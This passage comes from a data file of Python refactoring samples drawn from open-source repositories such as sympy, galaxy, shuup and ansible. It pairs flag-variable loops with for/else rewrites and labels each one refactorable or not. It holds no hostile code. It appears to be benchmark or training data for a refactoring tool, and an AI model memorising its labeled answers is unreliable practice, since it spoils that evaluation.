        For example, :obj:`input = ""unaffable""` wil return as output :obj:`[""un"", ""##aff"", ""##able""]`.

        Args:
          text: A single token or whitespace separated tokens. This should have
            already been passed through `BasicTokenizer`.

        Returns:
          A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
shuup,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/shuup/shuup/core/models/_product_shops.py,https://github.com/shuup/shuup/tree/master/shuup/core/models/_product_shops.py,ShopProduct,get_orderability_errors_for_variable_variation_parent$511,"def get_orderability_errors_for_variable_variation_parent(self, supplier, customer):
        from shuup.core.models import ProductVariationResult

        sellable = False
        for combo in self.product.get_all_available_combinations():
            res = ProductVariationResult.resolve(self.product, combo[""variable_to_value""])
            if not res:
                continue
            try:
                child_shop_product = res.get_shop_instance(self.shop)
            except ShopProduct.DoesNotExist:
                continue

            if child_shop_product.is_orderable(
                supplier=supplier,
                customer=customer,
                quantity=child_shop_product.minimum_purchase_quantity,
                allow_cache=False,
            ):
                sellable = True
                break
        if not sellable:
            yield ValidationError(_(""Product has no sellable children.""), code=""no_sellable_children"")","for combo in self.product.get_all_available_combinations():
    res = ProductVariationResult.resolve(self.product, combo['variable_to_value'])
    if not res:
        continue
    try:
        child_shop_product = res.get_shop_instance(self.shop)
    except ShopProduct.DoesNotExist:
        continue
    if child_shop_product.is_orderable(supplier=supplier, customer=customer, quantity=child_shop_product.minimum_purchase_quantity, allow_cache=False):
        sellable = True
        break
if not sellable:
    yield ValidationError(_('Product has no sellable children.'), code='no_sellable_children')","for combo in self.product.get_all_available_combinations():
    res = ProductVariationResult.resolve(self.product, combo['variable_to_value'])
    if not res:
        continue
    try:
        child_shop_product = res.get_shop_instance(self.shop)
    except ShopProduct.DoesNotExist:
        continue
    if child_shop_product.is_orderable(supplier=supplier, customer=customer, quantity=child_shop_product.minimum_purchase_quantity, allow_cache=False):
        break
else:
    yield ValidationError(_('Product has no sellable children.'), code='no_sellable_children')","for combo in self.product.get_all_available_combinations():
    res = ProductVariationResult.resolve(self.product, combo['variable_to_value'])
    if not res:
        continue
    try:
        child_shop_product = res.get_shop_instance(self.shop)
    except ShopProduct.DoesNotExist:
        continue
    if child_shop_product.is_orderable(supplier=supplier, customer=customer, quantity=child_shop_product.minimum_purchase_quantity, allow_cache=False):
        break
else:
    yield ValidationError(_('Product has no sellable children.'), code='no_sellable_children')",1,"for combo in self.product.get_all_available_combinations():
    res = ProductVariationResult.resolve(self.product, combo['variable_to_value'])
    if not res:
        continue
    try:
        child_shop_product = res.get_shop_instance(self.shop)
    except ShopProduct.DoesNotExist:
        continue
    if child_shop_product.is_orderable(supplier=supplier, customer=customer, quantity=child_shop_product.minimum_purchase_quantity, allow_cache=False):
        sellable = True
        break
if not sellable:
    yield ValidationError(_('Product has no sellable children.'), code='no_sellable_children')","break statement is executed:None
break statement is not executed:zejun1"
galaxy,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/galaxy/lib/tool_shed/metadata/repository_metadata_manager.py,https://github.com/ansible/galaxy/tree/master/lib/tool_shed/metadata/repository_metadata_manager.py,RepositoryMetadataManager,compare_repository_dependencies$235,"def compare_repository_dependencies(self, ancestor_repository_dependencies, current_repository_dependencies):
        """"""
        Determine if ancestor_repository_dependencies is the same as or a subset of
        current_repository_dependencies.
        """"""
        # The list of repository_dependencies looks something like:
        # [[""http://localhost:9009"", ""emboss_datatypes"", ""test"", ""ab03a2a5f407"", ""False"", ""False""]].
        # Create a string from each tuple in the list for easier comparison.
        if len(ancestor_repository_dependencies) <= len(current_repository_dependencies):
            for ancestor_tup in ancestor_repository_dependencies:
                a_tool_shed, a_repo_name, a_repo_owner, a_changeset_revision, \
                    a_prior_installation_required, \
                    a_only_if_compiling_contained_td = ancestor_tup
                cleaned_a_tool_shed = common_util.remove_protocol_from_tool_shed_url(a_tool_shed)
                found_in_current = False
                for current_tup in current_repository_dependencies:
                    c_tool_shed, c_repo_name, c_repo_owner, \
                        c_changeset_revision, c_prior_installation_required, \
                        c_only_if_compiling_contained_td = current_tup
                    cleaned_c_tool_shed = common_util.remove_protocol_from_tool_shed_url(c_tool_shed)
                    if cleaned_c_tool_shed == cleaned_a_tool_shed and \
                            c_repo_name == a_repo_name and \
                            c_repo_owner == a_repo_owner and \
                            c_changeset_revision == a_changeset_revision and \
                            util.string_as_bool(c_prior_installation_required) == util.string_as_bool(a_prior_installation_required) and \
                            util.string_as_bool(c_only_if_compiling_contained_td) == util.string_as_bool(a_only_if_compiling_contained_td):
                        found_in_current = True
                        break
                if not found_in_current:
                    # In some cases, the only difference between a dependency definition in the lists
                    # is the changeset_revision value.  We'll check to see if this is the case, and if
                    # the defined dependency is a repository that has metadata set only on its tip.
                    if not self.different_revision_defines_tip_only_repository_dependency(ancestor_tup,
                                                                                          current_repository_dependencies):
                        return self.NOT_EQUAL_AND_NOT_SUBSET
                    return self.SUBSET
            if len(ancestor_repository_dependencies) == len(current_repository_dependencies):
                return self.EQUAL
            else:
                return self.SUBSET
        return self.NOT_EQUAL_AND_NOT_SUBSET","for current_tup in current_repository_dependencies:
    (c_tool_shed, c_repo_name, c_repo_owner, c_changeset_revision, c_prior_installation_required, c_only_if_compiling_contained_td) = current_tup
    cleaned_c_tool_shed = common_util.remove_protocol_from_tool_shed_url(c_tool_shed)
    if cleaned_c_tool_shed == cleaned_a_tool_shed and c_repo_name == a_repo_name and (c_repo_owner == a_repo_owner) and (c_changeset_revision == a_changeset_revision) and (util.string_as_bool(c_prior_installation_required) == util.string_as_bool(a_prior_installation_required)) and (util.string_as_bool(c_only_if_compiling_contained_td) == util.string_as_bool(a_only_if_compiling_contained_td)):
        found_in_current = True
        break
if not found_in_current:
    if not self.different_revision_defines_tip_only_repository_dependency(ancestor_tup, current_repository_dependencies):
        return self.NOT_EQUAL_AND_NOT_SUBSET
    return self.SUBSET","for current_tup in current_repository_dependencies:
    (c_tool_shed, c_repo_name, c_repo_owner, c_changeset_revision, c_prior_installation_required, c_only_if_compiling_contained_td) = current_tup
    cleaned_c_tool_shed = common_util.remove_protocol_from_tool_shed_url(c_tool_shed)
    if cleaned_c_tool_shed == cleaned_a_tool_shed and c_repo_name == a_repo_name and (c_repo_owner == a_repo_owner) and (c_changeset_revision == a_changeset_revision) and (util.string_as_bool(c_prior_installation_required) == util.string_as_bool(a_prior_installation_required)) and (util.string_as_bool(c_only_if_compiling_contained_td) == util.string_as_bool(a_only_if_compiling_contained_td)):
        break
else:
    if not self.different_revision_defines_tip_only_repository_dependency(ancestor_tup, current_repository_dependencies):
        return self.NOT_EQUAL_AND_NOT_SUBSET
    return self.SUBSET","for current_tup in current_repository_dependencies:
    (c_tool_shed, c_repo_name, c_repo_owner, c_changeset_revision, c_prior_installation_required, c_only_if_compiling_contained_td) = current_tup
    cleaned_c_tool_shed = common_util.remove_protocol_from_tool_shed_url(c_tool_shed)
    if cleaned_c_tool_shed == cleaned_a_tool_shed and c_repo_name == a_repo_name and (c_repo_owner == a_repo_owner) and (c_changeset_revision == a_changeset_revision) and (util.string_as_bool(c_prior_installation_required) == util.string_as_bool(a_prior_installation_required)) and (util.string_as_bool(c_only_if_compiling_contained_td) == util.string_as_bool(a_only_if_compiling_contained_td)):
        break
else:
    if not self.different_revision_defines_tip_only_repository_dependency(ancestor_tup, current_repository_dependencies):
        return self.NOT_EQUAL_AND_NOT_SUBSET
    return self.SUBSET",1,"for current_tup in current_repository_dependencies:
    (c_tool_shed, c_repo_name, c_repo_owner, c_changeset_revision, c_prior_installation_required, c_only_if_compiling_contained_td) = current_tup
    cleaned_c_tool_shed = common_util.remove_protocol_from_tool_shed_url(c_tool_shed)
    if cleaned_c_tool_shed == cleaned_a_tool_shed and c_repo_name == a_repo_name and (c_repo_owner == a_repo_owner) and (c_changeset_revision == a_changeset_revision) and (util.string_as_bool(c_prior_installation_required) == util.string_as_bool(a_prior_installation_required)) and (util.string_as_bool(c_only_if_compiling_contained_td) == util.string_as_bool(a_only_if_compiling_contained_td)):
        found_in_current = True
        break
if not found_in_current:
    if not self.different_revision_defines_tip_only_repository_dependency(ancestor_tup, current_repository_dependencies):
        return self.NOT_EQUAL_AND_NOT_SUBSET
    return self.SUBSET","break statement is executed:None
break statement is not executed:zejun1"
Text-Pastry,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Text-Pastry/text_pastry_selection.py,https://github.com/duydao/Text-Pastry/tree/master//text_pastry_selection.py,SelectionHelper,scroll_into_view$284,"def scroll_into_view(cls, view, regions):
        if regions and len(regions) > 0:
            # scroll to the first selection if no selections in viewport
            found_region = False
            visible_region = view.visible_region()
            for region in regions:
                if region.intersects(visible_region):
                    # we have found a selection in the visible region, do nothing
                    found_region = True
                    break
            if not found_region:
                view.show(regions[0], True)","for region in regions:
    if region.intersects(visible_region):
        found_region = True
        break
if not found_region:
    view.show(regions[0], True)","for region in regions:
    if region.intersects(visible_region):
        break
else:
    view.show(regions[0], True)","for region in regions:
    if region.intersects(visible_region):
        break
else:
    view.show(regions[0], True)",1,"for region in regions:
    if region.intersects(visible_region):
        found_region = True
        break
if not found_region:
    view.show(regions[0], True)","break statement is executed:None
break statement is not executed:zejun1"
ansible-modules-extras,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/ansible-modules-extras/monitoring/zabbix_host.py,https://github.com/ansible/ansible-modules-extras/tree/master/monitoring/zabbix_host.py,Host,update_host$234,"def update_host(self, host_name, group_ids, status, host_id, interfaces, exist_interface_list, proxy_id, visible_name):
        try:
            if self._module.check_mode:
                self._module.exit_json(changed=True)
            parameters = {'hostid': host_id, 'groups': group_ids, 'status': status}
            if proxy_id:
                parameters['proxy_hostid'] = proxy_id
            if visible_name:
                parameters['name'] = visible_name 
            self._zapi.host.update(parameters)
            interface_list_copy = exist_interface_list
            if interfaces:
                for interface in interfaces:
                    flag = False
                    interface_str = interface
                    for exist_interface in exist_interface_list:
                        interface_type = interface['type']
                        exist_interface_type = int(exist_interface['type'])
                        if interface_type == exist_interface_type:
                            # update
                            interface_str['interfaceid'] = exist_interface['interfaceid']
                            self._zapi.hostinterface.update(interface_str)
                            flag = True
                            interface_list_copy.remove(exist_interface)
                            break
                    if not flag:
                        # add
                        interface_str['hostid'] = host_id
                        self._zapi.hostinterface.create(interface_str)
                        # remove
                remove_interface_ids = []
                for remove_interface in interface_list_copy:
                    interface_id = remove_interface['interfaceid']
                    remove_interface_ids.append(interface_id)
                if len(remove_interface_ids) > 0:
                    self._zapi.hostinterface.delete(remove_interface_ids)
        except Exception as e:
            self._module.fail_json(msg=""Failed to update host %s: %s"" % (host_name, e))","for exist_interface in exist_interface_list:
    interface_type = interface['type']
    exist_interface_type = int(exist_interface['type'])
    if interface_type == exist_interface_type:
        interface_str['interfaceid'] = exist_interface['interfaceid']
        self._zapi.hostinterface.update(interface_str)
        flag = True
        interface_list_copy.remove(exist_interface)
        break
if not flag:
    interface_str['hostid'] = host_id
    self._zapi.hostinterface.create(interface_str)","for exist_interface in exist_interface_list:
    interface_type = interface['type']
    exist_interface_type = int(exist_interface['type'])
    if interface_type == exist_interface_type:
        interface_str['interfaceid'] = exist_interface['interfaceid']
        self._zapi.hostinterface.update(interface_str)
        interface_list_copy.remove(exist_interface)
        break
else:
    interface_str['hostid'] = host_id
    self._zapi.hostinterface.create(interface_str)","for exist_interface in exist_interface_list:
    interface_type = interface['type']
    exist_interface_type = int(exist_interface['type'])
    if interface_type == exist_interface_type:
        interface_str['interfaceid'] = exist_interface['interfaceid']
        self._zapi.hostinterface.update(interface_str)
        interface_list_copy.remove(exist_interface)
        break
else:
    interface_str['hostid'] = host_id
    self._zapi.hostinterface.create(interface_str)",1,"for exist_interface in exist_interface_list:
    interface_type = interface['type']
    exist_interface_type = int(exist_interface['type'])
    if interface_type == exist_interface_type:
        interface_str['interfaceid'] = exist_interface['interfaceid']
        self._zapi.hostinterface.update(interface_str)
        flag = True
        interface_list_copy.remove(exist_interface)
        break
if not flag:
    interface_str['hostid'] = host_id
    self._zapi.hostinterface.create(interface_str)","break statement is executed:None
break statement is not executed:zejun1"
tissue,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/tissue/weight_tools.py,https://github.com/alessandro-zomparelli/tissue/tree/master//weight_tools.py,edges_bending,execute$1115,"def execute(self, context):
        try: ob = context.object
        except:
            self.report({'ERROR'}, ""Please select an Object"")
            return {'CANCELLED'}

        group_name = ""Edges Bending""
        ob.vertex_groups.new(name=group_name)

        # check if the object is Cloth or Softbody
        physics = False
        for m in ob.modifiers:
            if m.type == 'CLOTH' or m.type == 'SOFT_BODY':
                physics = True
                if context.scene.frame_current == 1 and self.frame != None:
                    context.scene.frame_current = self.frame
                break
        if not physics: self.frame = None

        #ob.data.update()
        #context.scene.update()
        me0 = ob.data
        me = simple_to_mesh(ob) #ob.to_mesh(preserve_all_data_layers=True, depsgraph=bpy.context.evaluated_depsgraph_get()).copy()
        if len(me.vertices) != len(me0.vertices) or len(me.edges) != len(me0.edges):
            self.report({'ERROR'}, ""The topology of the object should be"" +
                ""unaltered"")
        bm0 = bmesh.new()
        bm0.from_mesh(me0)
        bm = bmesh.new()
        bm.from_mesh(me)
        deformations = []
        for e0, e in zip(bm0.edges, bm.edges):
            try:
                ang = e.calc_face_angle_signed()
                ang0 = e0.calc_face_angle_signed()
                if self.bounds == 'UNSIGNED':
                    deformations.append(abs(ang-ang0))
                else:
                    deformations.append(ang-ang0)
            except: deformations.append(0)
        v_deformations = []
        for v in bm.verts:
            vdef = []
            for e in v.link_edges:
                vdef.append(deformations[e.index])
            v_deformations.append(mean(vdef))
        if self.bounds == 'MANUAL':
            min_def = radians(self.min_def)
            max_def = radians(self.max_def)
        elif self.bounds == 'AUTOMATIC':
            min_def = min(v_deformations)
            max_def = max(v_deformations)
        elif self.bounds == 'POSITIVE':
            min_def = 0
            max_def = min(v_deformations)
        elif self.bounds == 'NEGATIVE':
            min_def = 0
            max_def = max(v_deformations)
        elif self.bounds == 'UNSIGNED':
            min_def = 0
            max_def = max(v_deformations)
        delta_def = max_def - min_def

        # check undeformed errors
        if delta_def == 0:
            if self.bounds == 'MANUAL':
                delta_def = 0.0001
            else:
                message = ""The object doesn't have deformations.""
                if physics:
                    message = message + (""\nIf you are using Physics try to "" +
                        ""save it in the cache before."")
                self.report({'ERROR'}, message)
                return {'CANCELLED'}
        else:
            if physics:
                self.frame = context.scene.frame_current

        for i in range(len(v_deformations)):
            weight = (v_deformations[i] - min_def)/delta_def
            ob.vertex_groups[-1].add([i], weight, 'REPLACE')
        self.bounds_string = str(round(min_def,2)) + "" to "" + str(round(max_def,2))
        ob.vertex_groups[-1].name = group_name + "" "" + self.bounds_string
        ob.vertex_groups.update()
        ob.data.update()
        bpy.ops.object.mode_set(mode='WEIGHT_PAINT')
        bpy.data.meshes.remove(me)
        bm0.free()
        bm.free()
        return {'FINISHED'}","for m in ob.modifiers:
    if m.type == 'CLOTH' or m.type == 'SOFT_BODY':
        physics = True
        if context.scene.frame_current == 1 and self.frame != None:
            context.scene.frame_current = self.frame
        break
if not physics:
    self.frame = None","for m in ob.modifiers:
    if m.type == 'CLOTH' or m.type == 'SOFT_BODY':
        physics = True
        if context.scene.frame_current == 1 and self.frame != None:
            context.scene.frame_current = self.frame
        break
else:
    self.frame = None","for m in ob.modifiers:
    if m.type == 'CLOTH' or m.type == 'SOFT_BODY':
        physics = True
        if context.scene.frame_current == 1 and self.frame != None:
            context.scene.frame_current = self.frame
        break
else:
    self.frame = None",1,"for m in ob.modifiers:
    if m.type == 'CLOTH' or m.type == 'SOFT_BODY':
        physics = True
        if context.scene.frame_current == 1 and self.frame != None:
            context.scene.frame_current = self.frame
        break
if not physics:
    self.frame = None","break statement is executed:None
break statement is not executed:zejun1"
netzob,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/netzob/netzob/src/netzob/Inference/Grammar/GenericMAT.py,https://github.com/netzob/netzob/tree/master/netzob/src/netzob/Inference/Grammar/GenericMAT.py,GenericMAT,start_target$93,"def start_target(self):
        """"""This method opens the channel""""""

        try:
            self.stop_target()
        except Exception:
            pass

        self.process_wrapper.start()

        for nb_attempt in range(10):
            if self.process_wrapper.is_ready():
                break
            time.sleep(1)

        # we also try multiple times to open the channel with the target
        channel_is_open = False
        for nb_attemp in range(10):
            try:
                self.abstraction_layer.openChannel()
                channel_is_open = True
                break
            except Exception as e:
                logging.warn(
                    ""Target is not yet ready (channel cannot be opened): {}"".
                    format(e))
                time.sleep(1)

        if not channel_is_open:
            raise Exception(""Cannot open a channel with the target"")","for nb_attemp in range(10):
    try:
        self.abstraction_layer.openChannel()
        channel_is_open = True
        break
    except Exception as e:
        logging.warn('Target is not yet ready (channel cannot be opened): {}'.format(e))
        time.sleep(1)
if not channel_is_open:
    raise Exception('Cannot open a channel with the target')","for nb_attemp in range(10):
    try:
        self.abstraction_layer.openChannel()
        break
    except Exception as e:
        logging.warn('Target is not yet ready (channel cannot be opened): {}'.format(e))
        time.sleep(1)
else:
    raise Exception('Cannot open a channel with the target')","for nb_attemp in range(10):
    try:
        self.abstraction_layer.openChannel()
        break
    except Exception as e:
        logging.warn('Target is not yet ready (channel cannot be opened): {}'.format(e))
        time.sleep(1)
else:
    raise Exception('Cannot open a channel with the target')",1,"for nb_attemp in range(10):
    try:
        self.abstraction_layer.openChannel()
        channel_is_open = True
        break
    except Exception as e:
        logging.warn('Target is not yet ready (channel cannot be opened): {}'.format(e))
        time.sleep(1)
if not channel_is_open:
    raise Exception('Cannot open a channel with the target')","break statement is executed:None
break statement is not executed:zejun1"
sympy,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/sympy/sympy/simplify/hyperexpand.py,https://github.com/sympy/sympy/tree/master/sympy/simplify/hyperexpand.py,,_reduce_order$1422,"def _reduce_order(ap, bq, gen, key):
    """""" Order reduction algorithm used in Hypergeometric and Meijer G """"""
    ap = list(ap)
    bq = list(bq)

    ap.sort(key=key)
    bq.sort(key=key)

    nap = []
    # we will edit bq in place
    operators = []
    for a in ap:
        op = None
        for i in range(len(bq)):
            op = gen(a, bq[i])
            if op is not None:
                bq.pop(i)
                break
        if op is None:
            nap.append(a)
        else:
            operators.append(op)

    return nap, bq, operators","for i in range(len(bq)):
    op = gen(a, bq[i])
    if op is not None:
        bq.pop(i)
        break
if op is None:
    nap.append(a)
else:
    operators.append(op)","for i in range(len(bq)):
    op = gen(a, bq[i])
    if op is not None:
        bq.pop(i)
        operators.append(op)
        break
else:
    nap.append(a)","for i in range(len(bq)):
    op = gen(a, bq[i])
    if op is not None:
        bq.pop(i)
        operators.append(op)
        break
else:
    nap.append(a)",1,"for i in range(len(bq)):
    op = gen(a, bq[i])
    if op is not None:
        bq.pop(i)
        break
if op is None:
    nap.append(a)
else:
    operators.append(op)","break statement is executed:None
break statement is not executed:zejun1"
Listed-company-news-crawl-and-text-analysis,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Listed-company-news-crawl-and-text-analysis/Crawler/crawler_jrj.py,https://github.com/DemonDamon/Listed-company-news-crawl-and-text-analysis/tree/master/Crawler/crawler_jrj.py,WebCrawlFromjrj,getUrlInfo$71,"def getUrlInfo(self,url,specificDate):
        '''Analyze website and extract useful information.
        '''
        respond = requests.get(url)
        respond.encoding = BeautifulSoup(respond.content, ""lxml"").original_encoding
        bs = BeautifulSoup(respond.text, ""lxml"")
        meta_list = bs.find_all('meta')
        span_list = bs.find_all('span')
        part = bs.find_all('p')
        article = ''
        date = ''
        NotFoundPage = False
        for span in span_list:
            for child in span.children:
                if child == 'jrj_final_date_start':
                    date = span.text.replace('\r','').replace('\n','')
                    if date.find('年') != -1:
                        date = date.replace('年','-').replace('月','-').replace('日','')
                    break
            break
        if date == '':
            date = specificDate

        for p in part:
            if p.text.find('页面没有找到') != -1:
               NotFoundPage = True
               break

        if not NotFoundPage:
            for paragraph in part:
                chnstatus = self.countchn(str(paragraph))
                possible = chnstatus[1]
                if possible > self.Prob:
                   article += str(paragraph)

            while article.find('<') != -1 and article.find('>') != -1:
                  string = article[article.find('<'):article.find('>')+1]
                  article = article.replace(string,'')
            while article.find('\u3000') != -1:
                  article = article.replace('\u3000','')

            article = ' '.join(re.split(' +|\n+', article)).strip() 

        return date, article, NotFoundPage","for span in span_list:
    for child in span.children:
        if child == 'jrj_final_date_start':
            date = span.text.replace('\r', '').replace('\n', '')
            if date.find('年') != -1:
                date = date.replace('年', '-').replace('月', '-').replace('日', '')
            break
    break
if date == '':
    date = specificDate","for span in span_list:
    for child in span.children:
        if child == 'jrj_final_date_start':
            date = span.text.replace('\r', '').replace('\n', '')
            if date.find('年') != -1:
                date = date.replace('年', '-').replace('月', '-').replace('日', '')
            break
    break
else:
    date = specificDate",Cannot refactor,-1,"for span in span_list:
    for child in span.children:
        if child == 'jrj_final_date_start':
            date = span.text.replace('\r', '').replace('\n', '')
            if date.find('年') != -1:
                date = date.replace('年', '-').replace('月', '-').replace('日', '')
            break
    break
if date == '':
    date = specificDate","break statement is executed:None
break statement is not executed:zejun1"
Listed-company-news-crawl-and-text-analysis,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Listed-company-news-crawl-and-text-analysis/Crawler/crawler_jrj.py,https://github.com/DemonDamon/Listed-company-news-crawl-and-text-analysis/tree/master/Crawler/crawler_jrj.py,WebCrawlFromjrj,getUrlInfo$71,"def getUrlInfo(self,url,specificDate):
        '''Analyze website and extract useful information.
        '''
        respond = requests.get(url)
        respond.encoding = BeautifulSoup(respond.content, ""lxml"").original_encoding
        bs = BeautifulSoup(respond.text, ""lxml"")
        meta_list = bs.find_all('meta')
        span_list = bs.find_all('span')
        part = bs.find_all('p')
        article = ''
        date = ''
        NotFoundPage = False
        for span in span_list:
            for child in span.children:
                if child == 'jrj_final_date_start':
                    date = span.text.replace('\r','').replace('\n','')
                    if date.find('年') != -1:
                        date = date.replace('年','-').replace('月','-').replace('日','')
                    break
            break
        if date == '':
            date = specificDate

        for p in part:
            if p.text.find('页面没有找到') != -1:
               NotFoundPage = True
               break

        if not NotFoundPage:
            for paragraph in part:
                chnstatus = self.countchn(str(paragraph))
                possible = chnstatus[1]
                if possible > self.Prob:
                   article += str(paragraph)

            while article.find('<') != -1 and article.find('>') != -1:
                  string = article[article.find('<'):article.find('>')+1]
                  article = article.replace(string,'')
            while article.find('\u3000') != -1:
                  article = article.replace('\u3000','')

            article = ' '.join(re.split(' +|\n+', article)).strip() 

        return date, article, NotFoundPage","for p in part:
    if p.text.find('页面没有找到') != -1:
        NotFoundPage = True
        break
if not NotFoundPage:
    for paragraph in part:
        chnstatus = self.countchn(str(paragraph))
        possible = chnstatus[1]
        if possible > self.Prob:
            article += str(paragraph)
    while article.find('<') != -1 and article.find('>') != -1:
        string = article[article.find('<'):article.find('>') + 1]
        article = article.replace(string, '')
    while article.find('\u3000') != -1:
        article = article.replace('\u3000', '')
    article = ' '.join(re.split(' +|\n+', article)).strip()","for p in part:
    if p.text.find('页面没有找到') != -1:
        NotFoundPage = True
        break
else:
    for paragraph in part:
        chnstatus = self.countchn(str(paragraph))
        possible = chnstatus[1]
        if possible > self.Prob:
            article += str(paragraph)
    while article.find('<') != -1 and article.find('>') != -1:
        string = article[article.find('<'):article.find('>') + 1]
        article = article.replace(string, '')
    while article.find('\u3000') != -1:
        article = article.replace('\u3000', '')
    article = ' '.join(re.split(' +|\n+', article)).strip()","for p in part:
    if p.text.find('页面没有找到') != -1:
        NotFoundPage = True
        break
else:
    for paragraph in part:
        chnstatus = self.countchn(str(paragraph))
        possible = chnstatus[1]
        if possible > self.Prob:
            article += str(paragraph)
    while article.find('<') != -1 and article.find('>') != -1:
        string = article[article.find('<'):article.find('>') + 1]
        article = article.replace(string, '')
    while article.find('\u3000') != -1:
        article = article.replace('\u3000', '')
    article = ' '.join(re.split(' +|\n+', article)).strip()",1,"for p in part:
    if p.text.find('页面没有找到') != -1:
        NotFoundPage = True
        break
if not NotFoundPage:
    for paragraph in part:
        chnstatus = self.countchn(str(paragraph))
        possible = chnstatus[1]
        if possible > self.Prob:
            article += str(paragraph)
    while article.find('<') != -1 and article.find('>') != -1:
        string = article[article.find('<'):article.find('>') + 1]
        article = article.replace(string, '')
    while article.find('\u3000') != -1:
        article = article.replace('\u3000', '')
    article = ' '.join(re.split(' +|\n+', article)).strip()","break statement is executed:None
break statement is not executed:zejun1"
hangoutsbot,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/hangoutsbot/hangupsbot/plugins/syncrooms_config.py,https://github.com/hangoutsbot/hangoutsbot/tree/master/hangupsbot/plugins/syncrooms_config.py,,attachsyncout$13,"def attachsyncout(bot, event, *args):
    """"""attach conversations to a new/existing syncout group.
    supply list of conversation ids to attach. supplying an id that is not the current conversation
    will make the bot attempt to attach the current conversation to the specified id. if the id
    does not already exist in another syncout group, a new syncout will be created consisting of
    the current conversation and the specified id. if more than conversation id is supplied, the
    bot will attempt to attach all the conversation ids to an existing syncout provided at least
    one of the supplied ids is in an existing syncout. if all the conversation ids are new, then
    a new syncout will be created. append ""quietly"" to silently create/attach.
    """"""

    conversation_ids = list(args)

    quietly = False
    if ""quietly"" in conversation_ids:
        quietly = True
        conversation_ids.remove(""quietly"")

    if len(args) == 1:
        conversation_ids.append(event.conv_id)

    conversation_ids = list(set(conversation_ids))

    if len(conversation_ids) < 2:
        # need at least 2 ids, one has to be another room
        return

    if not bot.get_config_option('syncing_enabled'):
        return

    syncouts = bot.get_config_option('sync_rooms')

    if type(syncouts) is not list:
        syncouts = []

    affected_conversations = None

    found_existing = False
    for sync_room_list in syncouts:
        if any(x in conversation_ids for x in sync_room_list):
            missing_ids = list(set(conversation_ids) - set(sync_room_list))
            sync_room_list.extend(missing_ids)
            affected_conversations = list(sync_room_list) # clone
            found_existing = True
            break

    if not found_existing:
        syncouts.append(conversation_ids)
        affected_conversations = conversation_ids

    if affected_conversations:
        bot.config.set_by_path([""sync_rooms""], syncouts)
        bot.config.save()
        if found_existing:
            logger.info(""syncrooms extended"")
            html_message = _(""<i>syncout updated: {} conversations</i>"")
        else:
            logger.info(""syncrooms created"")
            html_message = _(""<i>syncout created: {} conversations</i>"")
    else:
        logger.info(""syncrooms unchanged"")
        html_message = _(""<i>syncouts unchanged</i>"")

    if not quietly:
        yield from bot.coro_send_message(event.conv, html_message.format(
            len(affected_conversations)))","for sync_room_list in syncouts:
    if any((x in conversation_ids for x in sync_room_list)):
        missing_ids = list(set(conversation_ids) - set(sync_room_list))
        sync_room_list.extend(missing_ids)
        affected_conversations = list(sync_room_list)
        found_existing = True
        break
if not found_existing:
    syncouts.append(conversation_ids)
    affected_conversations = conversation_ids","for sync_room_list in syncouts:
    if any((x in conversation_ids for x in sync_room_list)):
        missing_ids = list(set(conversation_ids) - set(sync_room_list))
        sync_room_list.extend(missing_ids)
        affected_conversations = list(sync_room_list)
        found_existing = True
        break
else:
    syncouts.append(conversation_ids)
    affected_conversations = conversation_ids","for sync_room_list in syncouts:
    if any((x in conversation_ids for x in sync_room_list)):
        missing_ids = list(set(conversation_ids) - set(sync_room_list))
        sync_room_list.extend(missing_ids)
        affected_conversations = list(sync_room_list)
        found_existing = True
        break
else:
    syncouts.append(conversation_ids)
    affected_conversations = conversation_ids",1,"for sync_room_list in syncouts:
    if any((x in conversation_ids for x in sync_room_list)):
        missing_ids = list(set(conversation_ids) - set(sync_room_list))
        sync_room_list.extend(missing_ids)
        affected_conversations = list(sync_room_list)
        found_existing = True
        break
if not found_existing:
    syncouts.append(conversation_ids)
    affected_conversations = conversation_ids","break statement is executed:None
break statement is not executed:zejun1"
Senta,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Senta/senta/data/tokenizer/tokenization_utils.py,https://github.com/baidu/Senta/tree/master/senta/data/tokenizer/tokenization_utils.py,PreTrainedWordpieceTokenizer,tokenize$299,"def tokenize(self, text):
    """"""Tokenizes a piece of text into its word pieces.

    This uses a greedy longest-match-first algorithm to perform tokenization
    using the given vocabulary.

    For example:
      input = ""unaffable""
      output = [""un"", ""##aff"", ""##able""]

    Args:
      text: A single token or whitespace separated tokens. This should have
        already been passed through `BasicTokenizer.

    Returns:
      A list of wordpiece tokens.
    """"""

    text = convert_to_unicode(text)

    output_tokens = []
    for token in whitespace_tokenize(text):
      chars = list(token)
      if len(chars) > self.max_input_chars_per_word:
        output_tokens.append(self.unk_token)
        continue

      is_bad = False
      start = 0
      sub_tokens = []
      while start < len(chars):
        end = len(chars)
        cur_substr = None
        while start < end:
          substr = """".join(chars[start:end])
